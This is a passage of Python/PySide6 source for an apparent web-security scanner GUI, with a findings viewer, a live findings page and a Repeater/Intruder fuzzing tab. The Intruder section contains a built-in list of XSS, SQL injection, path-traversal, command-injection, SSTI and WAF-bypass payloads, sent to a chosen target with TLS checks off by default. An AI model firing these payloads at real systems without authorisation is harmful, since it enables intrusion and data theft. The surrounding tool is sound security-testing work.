                    req_html += (f"<p style='font-size:11px; margin-top:4px;'><b>Payload:</b> "
                                 f"<code style='color:#e0b0ff;'>{_html.escape(str(r.get('payload'))[:400])}</code></p>")

                # Repro curl (attached by the engine for most findings via repro.build_curl)
                curl_html = ''
                curl_cmd = r.get('curl') or r.get('repro') or r.get('curl_command')
                if curl_cmd:
                    curl_html = ("<hr style='border:1px solid #2b2f33; margin:8px 0;'>"
                                 "<b>\U0001F501 Repro (curl)</b>"
                                 "<pre style='background:#0b0d0e; color:#9ee6a0; border:1px solid #2b2f33; "
                                 "border-radius:4px; padding:8px; white-space:pre-wrap; word-break:break-all; "
                                 f"font-family:Consolas,monospace; font-size:11px;'>{_html.escape(str(curl_cmd))}</pre>")

                return f"""
                <div style='color: #d7e1ea; font-size: 12px;'>
                    <b>{_t('technique', self._lang)}:</b> {_html.escape(str(technique))}<br>
                    <b>{_t('severity', self._lang)}:</b> <span style='color: {severity_colors.get(sev, "#808080")};'>{severity_icons.get(sev, '')} {sev}</span><br>
                    <b>{_t('status', self._lang)}:</b> {bypass_status}<br>
                    <b>{_t('category', self._lang)}:</b> {_html.escape(str(r.get('category', 'Other')))}<br>
                    <b>{_t('target', self._lang)}:</b> {_html.escape(str(r.get('target', 'N/A')))}<br>
                    <b>{_t('reason', self._lang)}:</b> {_html.escape(str(r.get('reason', 'N/A')))}<br>
                    <hr style='border: 1px solid #2b2f33; margin: 8px 0;'>
                    <b>\U0001F4D6 {_t('description', self._lang)}:</b><br>
                    <span style='color: #a0aab5; font-style: italic;'>{exploit_desc}</span>
                    {cve_cwe_html}
                    {req_html}
                    {curl_html}
                </div>
                """

            def update_results_tree():
                """Update the results tree based on current selection, filters, and search."""
                results_tree.clear()
                
                # Get selected site
                sel = site_list.currentItem()
                if not sel:
                    return
                target_key = sel.data(256)  # Qt.UserRole
                
                sort_idx = sort_combo.currentIndex()
                filter_idx = filter_combo.currentIndex()
                search_text = search_edit.text().strip()
                
                results = get_filtered_sorted_results(target_key, sort_idx, filter_idx, search_text)
                
                # Group by category for better organization
                by_category = {}
                for r in results:
                    cat = r.get('category', 'Other')
                    if cat not in by_category:
                        by_category[cat] = []
                    by_category[cat].append(r)
                
                for cat, items in sorted(by_category.items()):
                    # Create category parent
                    parent = QTreeWidgetItem([f'\U0001F4C1 {cat} ({len(items)})', '', '', ''])
                    parent.setFont(0, QFont('', 10, QFont.Bold))
                    results_tree.addTopLevelItem(parent)
                    
                    for r in items:
                        technique = r.get('technique', 'Unknown')
                        sev = r.get('severity', 'INFO')
                        category = r.get('category', 'Other')
                        reason = r.get('reason', '')
                        bypass = r.get('bypass', False)
                        
                        # Add bypass indicator to technique
                        if bypass:
                            technique = f'\u2705 {technique}'
                        
                        child = QTreeWidgetItem([technique, f'{severity_icons.get(sev, "")} {sev}', category, reason])
                        try:
                            child.setForeground(1, QBrush(QColor(severity_colors.get(sev, '#ffffff'))))
                        except Exception:
                            pass
                        
                        # Store full result data for details view
                        child.setData(0, 257, r)  # Qt.UserRole + 1
                        parent.addChild(child)
                        # Inline accordion: one hidden detail sub-row, rendered lazily
                        # the first time the finding is expanded (see on_finding_expanded).
                        detail = QTreeWidgetItem(['', '', '', ''])
                        detail.setData(0, 259, '__detail__')
                        child.addChild(detail)
                        try:
                            detail.setFirstColumnSpanned(True)
                        except Exception:
                            pass

                    parent.setExpanded(True)
            
            def on_site_selected():
                """Handle site selection change."""
                update_results_tree()
                details_text.clear()
            
            def on_result_selected():
                """Show details for selected result."""
                sel = results_tree.currentItem()
                r = sel.data(0, 257) if sel else None  # Qt.UserRole + 1
                # Findings carry a result dict; category parents and the inline
                # detail sub-rows do not, so they just clear the panel.
                if not isinstance(r, dict):
                    details_text.clear()
                    return

                # Build details HTML with exploit description
                bypass_status = '\u2705 BYPASS SUCCESSFUL' if r.get('bypass', False) else '\u274C No bypass'
                sev = r.get('severity', 'INFO')
                technique = r.get('technique', 'Unknown')
                
                # Get detailed exploit description
                exploit_desc = _get_exploit_description(technique)
                
                # Get CVE/CWE references
                cve_cwe_html = ''
                try:
                    from .database import get_cve_cwe_reference
                    ref = get_cve_cwe_reference(technique)
                    if ref:
                        cve_id = ref.get('cve', 'N/A')
                        cwe_id = ref.get('cwe', 'N/A')
                        cvss_score = ref.get('cvss', 0.0)
                        ref_desc = ref.get('description', '')
                        ref_url = ref.get('reference', '')
                        common_cves = ref.get('common_cves', [])
                        
                        # CVSS color coding
                        if cvss_score >= 9.0:
                            cvss_color = '#ff3333'
                            cvss_label = 'CRITICAL'
                        elif cvss_score >= 7.0:
                            cvss_color = '#ff8c00'
                            cvss_label = 'HIGH'
                        elif cvss_score >= 4.0:
                            cvss_color = '#ffd700'
                            cvss_label = 'MEDIUM'
                        else:
                            cvss_color = '#90ee90'
                            cvss_label = 'LOW'
                        
                        cve_cwe_html = f"""
                        <hr style='border: 1px solid #2b2f33; margin: 8px 0;'>
                        <b>🔐 {_t('cve_cwe_references', self._lang)}:</b><br>
                        <table style='margin-top: 5px; color: #d7e1ea;'>
                            <tr><td><b>CVE:</b></td><td style='padding-left: 10px;'><a href='https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve_id}' style='color: #66b3ff;'>{cve_id}</a></td></tr>
                            <tr><td><b>CWE:</b></td><td style='padding-left: 10px;'><a href='https://cwe.mitre.org/data/definitions/{cwe_id.replace("CWE-", "")}.html' style='color: #66b3ff;'>{cwe_id}</a></td></tr>
                            <tr><td><b>CVSS:</b></td><td style='padding-left: 10px;'><span style='color: {cvss_color}; font-weight: bold;'>{cvss_score} ({cvss_label})</span></td></tr>
                        </table>
                        """
                        if ref_desc:
                            cve_cwe_html += f"<p style='color: #a0aab5; font-size: 11px; margin-top: 5px;'>{ref_desc}</p>"
                        if ref_url:
                            cve_cwe_html += f"<p><a href='{ref_url}' style='color: #66b3ff; font-size: 11px;'>📚 {_t('reference_link', self._lang)}</a></p>"
                        if common_cves:
                            common_cves_links = ', '.join([f"<a href='https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve}' style='color: #66b3ff;'>{cve}</a>" for cve in common_cves[:3]])
                            cve_cwe_html += f"<p style='font-size: 11px;'><b>{_t('related_cves', self._lang)}:</b> {common_cves_links}</p>"
                except Exception:
                    pass
                
                details_html = f"""
                <div style='color: #d7e1ea; font-size: 12px;'>
                    <b>{_t('technique', self._lang)}:</b> {technique}<br>
                    <b>{_t('severity', self._lang)}:</b> <span style='color: {severity_colors.get(sev, "#808080")};'>{severity_icons.get(sev, '')} {sev}</span><br>
                    <b>{_t('status', self._lang)}:</b> {bypass_status}<br>
                    <b>{_t('category', self._lang)}:</b> {r.get('category', 'Other')}<br>
                    <b>{_t('target', self._lang)}:</b> {r.get('target', 'N/A')}<br>
                    <b>{_t('reason', self._lang)}:</b> {r.get('reason', 'N/A')}<br>
                    <hr style='border: 1px solid #2b2f33; margin: 8px 0;'>
                    <b>📖 {_t('description', self._lang)}:</b><br>
                    <span style='color: #a0aab5; font-style: italic;'>{exploit_desc}</span>
                    {cve_cwe_html}
                </div>
                """
                details_text.setHtml(details_html)
            
            def on_finding_expanded(item):
                """Lazily render a finding's inline detail the first time it is
                expanded, so hundreds of findings stay cheap (only expanded rows pay
                the HTML/widget cost). No-op for category parents and detail rows."""
                r = item.data(0, 257)
                if not isinstance(r, dict) or item.childCount() < 1:
                    return
                if item.data(0, 258):  # already built
                    return
                detail = item.child(0)
                try:
                    browser = QtWidgets.QTextBrowser()
                    browser.setOpenExternalLinks(True)
                    browser.setStyleSheet('QTextBrowser { background-color: #16181a; color: #d7e1ea; border: none; }')
                    browser.setHtml(build_finding_detail_html(r))
                    try:
                        vw = results_tree.viewport().width() - 48
                    except Exception:
                        vw = 800
                    if vw < 200:
                        vw = 800
                    doc = browser.document()
                    doc.setTextWidth(vw)
                    h = max(60, min(int(doc.size().height()) + 16, 460))
                    browser.setFixedHeight(h)
                    detail.setSizeHint(0, QtCore.QSize(0, h))
                    try:
                        detail.setFirstColumnSpanned(True)
                    except Exception:
                        pass
                    results_tree.setItemWidget(detail, 0, browser)
                    item.setData(0, 258, True)
                except Exception:
                    pass

            def on_finding_clicked(item, _col):
                """Expand-on-click: clicking a finding row toggles its inline detail."""
                r = item.data(0, 257)
                if isinstance(r, dict) and item.childCount() >= 1:
                    item.setExpanded(not item.isExpanded())

            def expand_all():
                # Expand category groups only (cheap); finding accordions render on demand.
                for i in range(results_tree.topLevelItemCount()):
                    results_tree.topLevelItem(i).setExpanded(True)

            def collapse_all():
                results_tree.collapseAll()

            # Connect signals
            site_list.currentItemChanged.connect(on_site_selected)
            sort_combo.currentIndexChanged.connect(lambda: update_results_tree())
            filter_combo.currentIndexChanged.connect(lambda: update_results_tree())
            search_edit.textChanged.connect(lambda: update_results_tree())
            results_tree.currentItemChanged.connect(on_result_selected)
            results_tree.itemExpanded.connect(on_finding_expanded)
            results_tree.itemClicked.connect(on_finding_clicked)
            expand_btn.clicked.connect(expand_all)
            collapse_btn.clicked.connect(collapse_all)
            
            # Select "All Sites" by default
            site_list.setCurrentRow(0)
            
            # Bottom buttons
            bottom_layout = QHBoxLayout()
            
            # HTTP Log button (only if data exists)
            if self._http_log:
                http_log_btn = QPushButton(_t('view_http_log', self._lang) if 'view_http_log' in TRANSLATIONS.get(self._lang, {}) else '📝 View HTTP Log')
                http_log_btn.setStyleSheet('QPushButton { background-color: #1f6feb; } QPushButton:hover { background-color: #388bfd; }')
                http_log_btn.clicked.connect(self._show_http_log_dialog)
                bottom_layout.addWidget(http_log_btn)
            
            # SSL Analysis button (only if data exists)
            if self._ssl_info and self._ssl_info.get('ssl_enabled'):
                ssl_info_btn = QPushButton(_t('view_ssl_info', self._lang) if 'view_ssl_info' in TRANSLATIONS.get(self._lang, {}) else '🔐 View SSL/TLS Info')
                ssl_info_btn.setStyleSheet('QPushButton { background-color: #238636; } QPushButton:hover { background-color: #2ea043; }')
                ssl_info_btn.clicked.connect(self._show_ssl_info_dialog)
                bottom_layout.addWidget(ssl_info_btn)
            
            bottom_layout.addStretch()
            
            export_btn = QPushButton(_t('export_view', self._lang))
            export_btn.clicked.connect(lambda: self._export_results_view(get_filtered_sorted_results(
                site_list.currentItem().data(256) if site_list.currentItem() else '__ALL__',
                sort_combo.currentIndex(),
                filter_combo.currentIndex(),
                search_edit.text().strip()
            )))
            bottom_layout.addWidget(export_btn)
            
            close_btn = QPushButton(_t('close', self._lang))
            close_btn.clicked.connect(lambda: self._navigate('scan'))
            bottom_layout.addWidget(close_btn)

            # Add bottom layout to right panel
            right_panel.addLayout(bottom_layout)

            return dlg

        def _export_results_view(self, results):
            """Export the current filtered/sorted view to JSON."""
            if not results:
                QMessageBox.information(self, _t('no_results', self._lang), _t('no_results_to_export', self._lang))
                return
            path, _ = QFileDialog.getSaveFileName(self, _t('export_results_view', self._lang), filter='JSON (*.json)')
            if not path:
                return
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    json.dump(results, f, indent=2)
                QMessageBox.information(self, _t('exported', self._lang), _t('exported_results', self._lang).format(count=len(results), path=path))
            except Exception as e:
                QMessageBox.critical(self, _t('export_failed', self._lang), str(e))
        
        # severity palette shared by the live findings window
        _LIVE_COLORS = {'CRITICAL': '#dc2626', 'HIGH': '#ea580c', 'MEDIUM': '#ca8a04',
                        'LOW': '#2563eb', 'INFO': '#6b7280'}
        _LIVE_ICONS = {'CRITICAL': '\U0001F534', 'HIGH': '\U0001F7E0', 'MEDIUM': '\U0001F7E1',
                       'LOW': '\U0001F535', 'INFO': 'ℹ️'}
        _LIVE_ORDER = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}

        def _live_refresh(self):
            """Rebuild the live findings tree from self._results honoring the filter."""
            tree = getattr(self, '_live_tree', None)
            if tree is None:
                return
            from PySide6.QtWidgets import QTreeWidgetItem
            from PySide6.QtGui import QBrush, QColor
            flt = self._live_filter.currentText() if getattr(self, '_live_filter', None) else 'All'

            def keep(r):
                sev = str(r.get('severity', 'INFO')).upper()
                if flt == 'All':
                    return True
                if flt == 'Bypasses only':
                    return bool(r.get('bypass'))
                return sev == flt

            rows = list(self._results)
            shown = sorted((r for r in rows if keep(r)),
                           key=lambda r: self._LIVE_ORDER.get(str(r.get('severity', 'INFO')).upper(), 5))
            tree.clear()
            for r in shown:
                sev = str(r.get('severity', 'INFO')).upper()
                tech = r.get('technique', '')
                if r.get('bypass'):
                    tech = '✅ ' + str(tech)
                item = QTreeWidgetItem([f"{self._LIVE_ICONS.get(sev, '')} {sev}", str(tech),
                                        str(r.get('category', '')), str(r.get('reason', ''))])
                try:
                    item.setForeground(0, QBrush(QColor(self._LIVE_COLORS.get(sev, '#ffffff'))))
                except Exception:
                    pass
                item.setData(0, 257, r)  # for the context menu / send-to-repeater
                tree.addTopLevelItem(item)
            if getattr(self, '_live_count_lbl', None):
                byp = sum(1 for r in rows if r.get('bypass'))
                self._live_count_lbl.setText(
                    f"{len(rows)} findings  •  {byp} bypasses  •  showing {len(shown)}")

        def _build_live_page(self):
            """Live, color-coded, filterable findings as an in-place page. The page
            is cached and assigned to self._live_window, so the same background
            code that pushes new findings keeps refreshing it while it's offscreen."""
            from PySide6.QtWidgets import (QVBoxLayout, QHBoxLayout, QComboBox,
                                           QLabel, QTreeWidget, QHeaderView)
            from PySide6.QtCore import Qt
            win = QWidget()
            win.setObjectName('LivePage')
            win.setStyleSheet("""
                QWidget#LivePage { background-color: #0f1112; }
                QLabel { color: #d7e1ea; font-size: 12px; }
                QComboBox { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33;
                    border-radius: 4px; padding: 4px 8px; }
                QTreeWidget { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; }
                QTreeWidget::item { padding: 3px; }
                QTreeWidget::item:selected { background-color: #3b82f6; }
            """)
            v = QVBoxLayout(win)
            v.setContentsMargins(22, 20, 22, 20)
            hdr = QLabel('◰  Live Findings')
            hdr.setStyleSheet('font-size:18px; font-weight:bold; color:#58a6ff;')
            v.addWidget(hdr)
            top = QHBoxLayout()
            self._live_count_lbl = QLabel('0 findings')
            top.addWidget(self._live_count_lbl)
            top.addStretch()
            top.addWidget(QLabel('Filter:'))
            self._live_filter = QComboBox()
            self._live_filter.addItems(['All', 'CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO',
                                        'Bypasses only'])
            self._live_filter.currentIndexChanged.connect(lambda *_: self._live_refresh())
            top.addWidget(self._live_filter)
            v.addLayout(top)
            self._live_tree = QTreeWidget()
            self._live_tree.setColumnCount(4)
            self._live_tree.setHeaderLabels(['Severity', 'Technique', 'Category', 'Reason'])
            self._live_tree.setAlternatingRowColors(True)
            try:
                self._live_tree.header().setSectionResizeMode(3, QHeaderView.Stretch)
            except Exception:
                pass
            v.addWidget(self._live_tree, 1)
            self._live_window = win
            self._live_refresh()
            return win

        def _build_repeater_page(self):
            """Repeater + Intruder + Decoder as an in-place page.

            * Repeater — craft a request, send it (TLS/redirect/timeout/proxy
              options), inspect the response. Requests run on a worker thread; a
              QTimer polls the future so the page never freezes.
            * Intruder — fuzz a FUZZ-marked request with built-in payload sets
              (XSS/SQLi/LFI/cmd-injection/SSTI/WAF-bypass) or a custom list, with
              baseline diffing + reflection detection.
            * Decoder — URL/Base64/HTML/Hex/unicode encode + decode.

            self._repeater_apply(prefill) loads a request into the Repeater tab.
            """
            from PySide6.QtWidgets import (QVBoxLayout, QHBoxLayout, QComboBox,
                                           QLineEdit, QPlainTextEdit, QPushButton, QLabel,
                                           QSplitter, QCheckBox, QSpinBox, QTabWidget,
                                           QTableWidget, QTableWidgetItem, QHeaderView,
                                           QAbstractItemView)
            from PySide6.QtCore import Qt, QTimer
            from PySide6.QtGui import QBrush, QColor
            import urllib.parse as _ulib
            import base64 as _b64
            import html as _html
            import re as _re

            # ---- built-in web-security fuzzing payload sets ----
            PAYLOADS = {
                'XSS': ['<script>alert(1)</script>', '"><script>alert(1)</script>',
                        "'><script>alert(1)</script>", '<img src=x onerror=alert(1)>',
                        '<svg/onload=alert(1)>', 'javascript:alert(1)',
                        '<body onload=alert(1)>', '"><img src=x onerror=alert(document.domain)>',
                        '<iframe src=javascript:alert(1)>', '<details/open/ontoggle=alert(1)>'],
                'SQLi': ["'", '"', "' OR '1'='1", "' OR 1=1-- -", '" OR "1"="1',
                         "admin'-- -", "' OR ''='", "1' UNION SELECT NULL-- -",
                         "1' AND SLEEP(5)-- -", "'; WAITFOR DELAY '0:0:5'-- -",
                         "') OR ('1'='1", "1 OR 1=1"],
                'LFI / Path Traversal': ['../../../../etc/passwd',
                         '../../../../../../etc/passwd', '....//....//....//etc/passwd',
                         '..%2f..%2f..%2fetc%2fpasswd', '..%252f..%252fetc%252fpasswd',
                         '/etc/passwd', 'C:\\Windows\\win.ini', '..\\..\\..\\windows\\win.ini',
                         'php://filter/convert.base64-encode/resource=index.php', '/etc/passwd%00'],
                'Command Injection': ['; id', '| id', '|| id', '& id', '&& id', '`id`',
                         '$(id)', '; sleep 5', '| sleep 5', '%0a id', '; cat /etc/passwd'],
                'SSTI': ['{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>', '${{7*7}}',
                         '{{7*\'7\'}}', '{{config}}', '${T(java.lang.Runtime)}', '*{7*7}'],
                'WAF Bypass': ['SeLeCt', '/*!50000SELECT*/', 'uni/**/on sel/**/ect',
                         '1%0aOR%0a1=1', '<scr<script>ipt>alert(1)</scr</script>ipt>',
                         '<sCrIpT>alert(1)</sCrIpT>', '%253Cscript%253E',
                         "' /*!OR*/ '1'='1", '+UNION+SELECT+', '%00', '%09', '..%c0%af'],
            }
            SQL_ERR_RE = _re.compile(
                r'(?i)SQL syntax|mysql_fetch|valid MySQL result|ORA-\d{5}|Unclosed quotation|SQLSTATE|PostgreSQL.{0,40}ERROR')

            def _shq(s):
                return "'" + str(s).replace("'", "'\\''") + "'"

            def _parse_headers(text):
                hdrs = {}
                for line in (text or '').splitlines():
                    if ':' in line:
                        k, v = line.split(':', 1)
                        if k.strip():
                            hdrs[k.strip()] = v.strip()
                return hdrs

            def _send_request(m, u, hdrs, data, opts):
                """Blocking HTTP send used by both Repeater and Intruder workers."""
                import time as _time
                import requests
                try:
                    import urllib3
                    urllib3.disable_warnings()
                except Exception:
                    pass
                proxies = None
                if opts.get('proxy'):
                    proxies = {'http': opts['proxy'], 'https': opts['proxy']}
                t0 = _time.monotonic()
                r = requests.request(
                    m, u, headers=hdrs or None,
                    data=(data.encode() if isinstance(data, str) and data else (data or None)),
                    timeout=opts.get('timeout', 20), verify=opts.get('verify', False),
                    allow_redirects=opts.get('redirects', False), proxies=proxies)
                return r, (_time.monotonic() - t0)

            def _num_item(n):
                it = QTableWidgetItem()
                try:
                    it.setData(Qt.ItemDataRole.DisplayRole, int(n))
                except Exception:
                    it.setText(str(n))
                return it

            dlg = QWidget()
            dlg.setObjectName('RepeaterPage')
            dlg.setStyleSheet("""
                QWidget#RepeaterPage { background-color: #0f1112; }
                QLabel { color: #9aa4b2; font-size: 11px; }
                QComboBox, QLineEdit, QPlainTextEdit, QSpinBox { background-color: #16181a; color: #d7e1ea;
                    border: 1px solid #2b2f33; border-radius: 4px; padding: 6px;
                    font-family: 'Consolas','Menlo',monospace; }
                QPushButton { background-color: #1f6feb; color: #fff; border: none;
                    padding: 7px 14px; border-radius: 4px; }
                QPushButton:hover { background-color: #388bfd; }
                QPushButton:disabled { background-color: #2b2f33; color: #6b7280; }
            """)
            root = QVBoxLayout(dlg)
            _hdr = QLabel('↻  Repeater · Intruder · Decoder')
            _hdr.setStyleSheet('font-size:18px; font-weight:bold; color:#58a6ff;')
            root.addWidget(_hdr)
            tabs = QTabWidget()
            root.addWidget(tabs, 1)

            # ============================ REPEATER TAB ============================
            rep = QtWidgets.QWidget()
            rl = QVBoxLayout(rep)
            row = QHBoxLayout()
            method = QComboBox()
            method.addItems(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'])
            url = QLineEdit(); url.setPlaceholderText('https://target/path')
            send_btn = QPushButton('Send')
            curl_btn = QPushButton('Copy cURL')
            intr_btn = QPushButton('→ Intruder')
            row.addWidget(method); row.addWidget(url, 1)
            row.addWidget(send_btn); row.addWidget(curl_btn); row.addWidget(intr_btn)
            rl.addLayout(row)

            # request options
            orow = QHBoxLayout()
            redir_chk = QCheckBox('Follow redirects')
            verify_chk = QCheckBox('Verify TLS')
            timeout_spin = QSpinBox(); timeout_spin.setRange(1, 120); timeout_spin.setValue(20)
            proxy_edit = QLineEdit()
            proxy_edit.setPlaceholderText('proxy host:port (chain through Burp/Caido)')
            orow.addWidget(redir_chk); orow.addWidget(verify_chk)
            orow.addWidget(QLabel('Timeout:')); orow.addWidget(timeout_spin)
            orow.addWidget(QLabel('Proxy:')); orow.addWidget(proxy_edit, 1)
            rl.addLayout(orow)

            try:
                t = self.target_edit.text().strip()
                if t:
                    url.setText(t)
            except Exception:
                pass

            def _get_opts():
                p = proxy_edit.text().strip()
                if p and '://' not in p:
                    p = 'http://' + p
                return {'redirects': redir_chk.isChecked(), 'verify': verify_chk.isChecked(),
                        'timeout': timeout_spin.value(), 'proxy': p}

            splitter = QSplitter(Qt.Vertical)
            req_box = QtWidgets.QWidget()
            req_lay = QVBoxLayout(req_box); req_lay.setContentsMargins(0, 0, 0, 0)
            req_lay.addWidget(QLabel('REQUEST HEADERS  (one per line: Name: value)'))
            headers_edit = QPlainTextEdit()
            headers_edit.setPlaceholderText('User-Agent: Blackthorn-Repeater\nX-Forwarded-For: 127.0.0.1')
            headers_edit.setMaximumHeight(150)
            req_lay.addWidget(headers_edit)
            req_lay.addWidget(QLabel('REQUEST BODY  (optional)'))
            body_edit = QPlainTextEdit(); body_edit.setMaximumHeight(120)
            req_lay.addWidget(body_edit)
            splitter.addWidget(req_box)

            resp_box = QtWidgets.QWidget()
            resp_lay = QVBoxLayout(resp_box); resp_lay.setContentsMargins(0, 0, 0, 0)
            status_label = QLabel('Ready.')
            status_label.setStyleSheet('color:#d7e1ea; font-size:12px; padding:2px;')
            resp_lay.addWidget(status_label)
            notes_lbl = QLabel('')
            notes_lbl.setStyleSheet('color:#f59e0b; font-size:12px; padding:2px;')
            resp_lay.addWidget(notes_lbl)
            response_edit = QPlainTextEdit(); response_edit.setReadOnly(True)
            resp_lay.addWidget(response_edit, 1)
            splitter.addWidget(resp_box)
            splitter.setSizes([300, 400])
            rl.addWidget(splitter, 1)
            tabs.addTab(rep, 'Repeater')

            pool = concurrent.futures.ThreadPoolExecutor(max_workers=4)
            state = {'fut': None}
            timer = QTimer(dlg)

            def _send():
                m = method.currentText()
                u = url.text().strip()
                if u.lower().startswith('url:'):
                    u = u[4:].strip()
                if u and '://' not in u:
                    u = 'https://' + u
                    url.setText(u)
                if not u:
                    status_label.setText('Enter a URL first.')
                    return
                hdrs = _parse_headers(headers_edit.toPlainText())
                data = body_edit.toPlainText() or None
                opts = _get_opts()
                send_btn.setEnabled(False)
                notes_lbl.setText('')
                status_label.setText(f'Sending {m} {u} …')
                response_edit.clear()
                state['fut'] = pool.submit(_send_request, m, u, hdrs, data, opts)
                timer.start(100)

            def _poll():
                fut = state.get('fut')
                if not fut or not fut.done():
                    return
                timer.stop()
                send_btn.setEnabled(True)
                try:
                    r, dt = fut.result()
                    status_label.setText(
                        f"HTTP {r.status_code} {r.reason}   •   {len(r.content)} bytes   •   {dt*1000:.0f} ms")
                    hdr_txt = '\n'.join(f"{k}: {v}" for k, v in r.headers.items())
                    body_txt = r.text if len(r.text) <= 200000 else r.text[:200000] + '\n…(truncated)'
                    response_edit.setPlainText(f"{hdr_txt}\n\n{body_txt}")
                    notes = []
                    if r.status_code >= 500:
                        notes.append('5xx server error')
                    if SQL_ERR_RE.search(r.text or ''):
                        notes.append('⚠ SQL error in response')
                    notes_lbl.setText('   ·   '.join(notes))
                except Exception as e:
                    status_label.setText('Request failed.')
                    response_edit.setPlainText(f"{type(e).__name__}: {e}")

            def _copy_curl():
                parts = [f"curl -X {method.currentText()} {_shq(url.text().strip())}"]
                for line in headers_edit.toPlainText().splitlines():
                    if ':' in line and line.split(':', 1)[0].strip():
                        parts.append(f"-H {_shq(line.strip())}")
                if body_edit.toPlainText().strip():
                    parts.append(f"--data {_shq(body_edit.toPlainText())}")
                if not verify_chk.isChecked():
                    parts.append('-k')
                if redir_chk.isChecked():
                    parts.append('-L')
                try:
                    QtWidgets.QApplication.clipboard().setText(' '.join(parts))
                    status_label.setText('cURL copied to clipboard.')
                except Exception:
                    pass

            timer.timeout.connect(_poll)
            send_btn.clicked.connect(_send)
            url.returnPressed.connect(_send)
            curl_btn.clicked.connect(_copy_curl)

            # ============================ INTRUDER TAB ============================
            intr = QtWidgets.QWidget()
            il = QVBoxLayout(intr)
            il.addWidget(QLabel('Request template — put the marker  FUZZ  where payloads go '
                                '(URL, a header value, or the body):'))
            irow = QHBoxLayout()
            i_method = QComboBox(); i_method.addItems(['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
            i_url = QLineEdit(); i_url.setPlaceholderText('https://target/search?q=FUZZ')
            load_btn = QPushButton('← Load from Repeater')
            irow.addWidget(i_method); irow.addWidget(i_url, 1); irow.addWidget(load_btn)
            il.addLayout(irow)
            i_headers = QPlainTextEdit(); i_headers.setMaximumHeight(80)
            i_headers.setPlaceholderText('headers (optional) — e.g.  Cookie: id=FUZZ')
            il.addWidget(i_headers)
            i_body = QPlainTextEdit(); i_body.setMaximumHeight(70)
            i_body.setPlaceholderText('body (optional) — e.g.  username=admin&password=FUZZ')
            il.addWidget(i_body)

            prow = QHBoxLayout()
            pset_combo = QComboBox(); pset_combo.addItems(list(PAYLOADS.keys()) + ['Custom'])
            urlenc_chk = QCheckBox('URL-encode payloads')
            i_start = QPushButton('▶ Start')
            i_stop = QPushButton('■ Stop'); i_stop.setEnabled(False)
            i_status = QLabel('')
            prow.addWidget(QLabel('Payload set:')); prow.addWidget(pset_combo)
            prow.addWidget(urlenc_chk); prow.addWidget(i_start); prow.addWidget(i_stop)
            prow.addWidget(i_status, 1)
            il.addLayout(prow)
            custom_edit = QPlainTextEdit(); custom_edit.setMaximumHeight(60)
            custom_edit.setPlaceholderText('custom payloads — one per line (used for "Custom", else appended)')
            il.addWidget(custom_edit)

            isplit = QSplitter(Qt.Vertical)
            res_table = QTableWidget(0, 6)
            res_table.setHorizontalHeaderLabels(['#', 'Payload', 'Status', 'Length', 'Time(ms)', 'Notes'])
            res_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
            res_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
            res_table.setSortingEnabled(True)
            try:
                res_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
            except Exception:
                pass
            isplit.addWidget(res_table)
            i_detail = QPlainTextEdit(); i_detail.setReadOnly(True)
            isplit.addWidget(i_detail)
            isplit.setSizes([360, 180])
            il.addWidget(isplit, 1)
            tabs.addTab(intr, 'Intruder')

            ipool = {'pool': None}
            istate = {'pending': [], 'baseline': None, 'baseline_fut': None, 'responses': {}}
            itimer = QTimer(dlg)

            def _load_from_repeater():
                i_method.setCurrentText(method.currentText())
                i_url.setText(url.text())
                i_headers.setPlainText(headers_edit.toPlainText())
                i_body.setPlainText(body_edit.toPlainText())

            def _intr_build(payload):
                enc = _ulib.quote(payload, safe='') if urlenc_chk.isChecked() else payload
                u = i_url.text().replace('FUZZ', enc)
                if u and '://' not in u:
                    u = 'https://' + u
                hdrs = _parse_headers(i_headers.toPlainText().replace('FUZZ', enc))
                body = i_body.toPlainText().replace('FUZZ', enc) or None
                return u, hdrs, body

            def _intr_start():
                m = i_method.currentText()
                template = i_url.text() + i_headers.toPlainText() + i_body.toPlainText()
                if 'FUZZ' not in template:
                    i_status.setText('Add the FUZZ marker to the URL/headers/body first.')
                    return
                pset = pset_combo.currentText()
                if pset == 'Custom':
                    payloads = [x for x in custom_edit.toPlainText().splitlines() if x.strip()]
                else:
                    payloads = list(PAYLOADS.get(pset, []))
                    payloads += [x for x in custom_edit.toPlainText().splitlines() if x.strip()]
                if not payloads:
                    i_status.setText('No payloads.')
                    return
                res_table.setRowCount(0)
                istate['responses'] = {}
                istate['baseline'] = None
                opts = _get_opts()
                pool2 = concurrent.futures.ThreadPoolExecutor(max_workers=10)
                ipool['pool'] = pool2
                bu, bh, bb = _intr_build('')   # baseline = marker removed
                istate['baseline_fut'] = pool2.submit(_send_request, m, bu, bh, bb, opts)
                pending = []
                res_table.setSortingEnabled(False)
                for i, p in enumerate(payloads):
                    u, hdrs, body = _intr_build(p)
                    r = res_table.rowCount(); res_table.insertRow(r)
                    res_table.setItem(r, 0, _num_item(i + 1))
                    pi = QTableWidgetItem(p); pi.setData(Qt.ItemDataRole.UserRole, r)
                    res_table.setItem(r, 1, pi)
                    res_table.setItem(r, 2, QTableWidgetItem('…'))
                    pending.append((r, p, pool2.submit(_send_request, m, u, hdrs, body, opts)))
                res_table.setSortingEnabled(True)
                istate['pending'] = pending
                i_start.setEnabled(False); i_stop.setEnabled(True)
                i_status.setText(f'Fuzzing {len(payloads)} payload(s)…')
                itimer.start(150)

            def _intr_poll():
                if istate.get('baseline') is None:
                    bf = istate.get('baseline_fut')
                    if bf is not None and bf.done():
                        try:
                            br, _bd = bf.result()
                            istate['baseline'] = (br.status_code, len(br.content))
                        except Exception:
                            istate['baseline'] = (0, 0)
                still = []
                for (rowi, p, fut) in istate['pending']:
                    if not fut.done():
                        still.append((rowi, p, fut)); continue
                    try:
                        r, dt = fut.result()
                        st, ln = r.status_code, len(r.content)
                        res_table.setItem(rowi, 2, _num_item(st))
                        res_table.setItem(rowi, 3, _num_item(ln))
